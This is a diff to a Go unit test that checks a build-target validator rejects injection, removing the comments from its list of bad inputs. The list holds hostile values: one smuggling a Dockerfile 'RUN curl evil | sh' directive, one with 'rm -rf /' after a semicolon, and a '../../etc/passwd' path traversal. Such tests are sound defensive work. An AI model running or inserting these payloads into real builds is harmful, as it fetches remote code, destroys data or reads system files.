@@ -15,11 +15,11 @@ import (
 // It keeps validation, side effects, and returned values within this package's contract.
 func TestValidateBuildTargetRejectsInjection(t *testing.T) {
 	bad := []string{
-		"app\"\nRUN curl evil | sh", // newline + quote -> inject Dockerfile directive
-		"app; rm -rf /",             // shell metacharacters
-		"../../etc/passwd",          // path traversal
-		"a b",                       // whitespace
-		"",                          // empty
+		"app\"\nRUN curl evil | sh",
+		"app; rm -rf /",
+		"../../etc/passwd",
+		"a b",
+		"",
 	}
 	for _, tgt := range bad {
 		cfg := &BenchmarkConfig{Language: "go", Build: BuildSection{Type: "go", Target: tgt}}
